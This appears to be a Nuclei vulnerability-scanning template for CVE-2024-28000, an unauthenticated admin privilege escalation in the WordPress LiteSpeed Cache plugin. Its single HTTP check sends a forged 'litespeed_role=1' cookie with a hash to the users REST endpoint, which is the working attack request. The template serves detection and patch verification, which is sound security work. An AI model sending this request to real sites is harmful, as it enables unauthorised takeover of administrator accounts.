id: CVE-2024-28000
info:
  name:  WordPress LiteSpeed Cache - Unauthenticated Privilege Escalation to Admin
  author: hoanpk
  severity: critical
  description: |
    Incorrect Privilege Assignment vulnerability in LiteSpeed Technologies LiteSpeed Cache litespeed-cache allows Privilege Escalation.
    This issue affects LiteSpeed Cache: from 1.9 through 6.3.0.1.
    reference:
    - https://patchstack.com/database/vulnerability/litespeed-cache/wordpress-litespeed-cache-plugin-6-3-0-1-unauthenticated-privilege-escalation-vulnerability?_s_id=cve
    - https://www.exploit-db.com/exploits/52328
    - https://nvd.nist.gov/vuln/detail/CVE-2024-28000
    - https://vulncheck.com/xdb/6f169f41e032
    - https://github.com/JohnDoeAnonITA/CVE-2024-28000
    - https://github.com/advisories/GHSA-3cp9-7899-h8r7
    - https://github.com/SSSSuperX/CVE-2024-28000
    - https://github.com/arch1m3d/CVE-2024-28000
    - https://github.com/ebrasha/CVE-2024-28000
    - https://github.com/Alucard0x1/CVE-2024-28000
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-266
    cpe: cpe:2.3:a:litespeedtech:litespeed_cache:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 2
    product: litespeed_cache
    vendor: litespeedtech
  tags: cve,cve2024,wordpress,litespeed,wp-plugin,priv-esc

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-json/wp/v2/users"
    headers:
      Cookie: "litespeed_role=1; litespeed_hash={{litespeed_hash}}"
    redirects: true
    max-redirects: 2

    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: regex
        part: header
        regex:
          - '(?i)Allow:\s*GET,\s*POST'
      - type: word
        part: body
        words:
          - '{"allow":["GET","POST","PUT","PATCH","DELETE"]}'
